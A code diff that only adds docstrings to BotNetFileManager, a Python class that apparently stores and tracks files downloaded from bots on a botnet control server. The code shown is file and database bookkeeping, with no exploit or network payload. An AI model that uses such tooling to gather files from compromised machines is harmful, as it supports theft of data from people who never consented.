@@ -22,6 +22,10 @@ class BotNetFileManager:
             os.makedirs(self.outputdir)
 
     def checkDatabase(self):
+        '''
+        Checks database for missing files. Removes entries corresponding to
+        those nonexistent entities.
+        '''
         with self.lock:
             entries = FilenameEntry.query.all()
             for entry in entries:
@@ -30,6 +34,13 @@ class BotNetFileManager:
             db.session.commit()
 
     def fileIsDownloading(self, user, filename):
+        '''
+        Returns if it appears a file is in the process of being downloaded from
+        a bot
+        :param user: username of bot
+        :param filename: file being downloaded
+        :return: True/False
+        '''
         uf = (user,filename)
         with self.lock:
             if uf in self.fileobjs:
@@ -37,6 +48,12 @@ class BotNetFileManager:
             return False
 
     def fileIsDownloaded(self, user, filename):
+        '''
+        Returns if the file is on the server and not currently being downloaded
+        :param user: username of bot
+        :param filename: file being downloaded
+        :return: True/False
+        '''
         uf = (user, filename)
         with self.lock:
             if uf in self.fileobjs:
@@ -46,6 +63,12 @@ class BotNetFileManager:
                 return entry is not None
 
     def appendBytesToFile(self, user, filename, wbytes):
+        '''
+        Adds bytes to a local file, creates new file if needed and adds item to db
+        :param user: username of bot
+        :param filename: filename being downloaded
+        :param wbytes: bytes to append
+        '''
         uf = (user, filename)
         with self.lock:
             entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
@@ -72,6 +95,11 @@ class BotNetFileManager:
                 self.fileobjs[uf].write(wbytes)
 
     def closeFile(self, user, filename):
+        '''
+        Close a file, ceasing download
+        :param user: username of bot
+        :param filename: filename being downloaded
+        '''
         uf = (user, filename)
         with self.lock:
             if uf in self.fileobjs:
@@ -80,6 +108,12 @@ class BotNetFileManager:
                 self.fileobjs.pop(uf)
 
     def setFileSize(self, user, filename, filesize):
+        '''
+        Sets the maximum size of file
+        :param user: username
+        :param filename: filename
+        :param filesize: maximum size of file
+        '''
         uf = (user, filename)
         with self.lock:
             entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
@@ -100,7 +134,7 @@ class BotNetFileManager:
     def getFilesAndInfo(self):
         '''
         Creates a list of fileinfo objects with {user, filename, size, downloaded}
-        :return:
+        :return: dict(user=user,filename=filename,size=size,downloaded=downloaded) for each
         '''
         # Get (user,file) list
         with self.lock:
@@ -115,6 +149,12 @@ class BotNetFileManager:
             return fileinfo
 
     def getFileName(self, user, filename):
+        '''
+        Gets the local filename associated with the remote file
+        :param user: username of bot
+        :param filename: remote filename
+        :return: local filename or None
+        '''
         uf = (user, filename)
         with self.lock:
             entry = FilenameEntry.query.filter_by(user=user, remote_filename=filename).first()
@@ -123,6 +163,12 @@ class BotNetFileManager:
             return None
 
     def deleteFile(self, user, filename):
+        '''
+        Removes local copy of remote file. Ceases download if needed.
+        :param user: username of bot
+        :param filename: remote filename
+        :return: True/False success
+        '''
         uf = (user, filename)
         with self.lock:
             print("[*] Deleting {}:{}".format(user,filename))
@@ -165,5 +211,6 @@ class FilenameEntry(db.Model):
         else:
             return "<{}:{}@{}>".format(self.user,os.path.basename(self.remote_filename),
                                        os.path.basename(self.real_filename))
+
     def __str__(self):
         return self.__repr__()
